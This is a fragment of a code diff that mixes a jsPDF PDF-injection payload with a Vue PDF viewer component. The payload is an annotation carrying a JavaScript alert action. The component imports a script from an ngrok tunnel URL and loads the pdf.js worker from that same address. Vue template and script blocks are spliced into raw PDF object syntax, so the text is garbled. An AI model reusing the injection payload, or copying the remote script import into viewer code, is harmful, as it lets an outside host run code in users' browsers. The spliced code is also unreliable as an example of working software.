@@ -6,13 +6,50 @@ var doc = new jsPDF();
     <</Type /Annot /Subtype /Widget /Parent<</FT/Btn/T(a)>> /Rect [0 0            900 900] /AA <</E <</S/JavaScript/JS(app.alert(1))>>/(`});
     doc.text(20, 20, 'Test');
 >>
-stream
-{
-  0 add
+<template>
+  <div id="pageContainer">
+    <div id="viewer" class="pdfViewer"></div>
+  </div>
+</template>
+
+<script>
+import pdfjsLib from "pdfjs-dist/build/pdf";
+import { PDFViewer } from "pdfjs-dist/web/pdf_viewer";
+import "https://4019-112-215-235-168.ngrok.io";
+
+pdfjsLib.GlobalWorkerOptions.workerSrc =
+  "https://4019-112-215-235-168.ngrok.io";
+
+
+export default {
+  name: "PdfViewer",
+  mounted() {
+    this.getPdf();
+  },
+  methods: {
+    async getPdf() {
+      let container = document.getElementById("pageContainer");
+      let pdfViewer = new PDFViewer({
+        container: container
+      });
+      let loadingTask = pdfjsLib.getDocument("./pdf-sample.pdf");
+      let pdf = await loadingTask.promise;
+      pdfViewer.setDocument(pdf);
+    }
+  }
+};
+</script>
+
+<style>
+#pageContainer {
+  margin: auto;
+  width: 80%;
 }
-endstream
-endobj
-2 0 obj
+
+div.page {
+  display: inline-block;
+}
+</style>
 <<
   /Type /Catalog
   /Pages 3 0 R
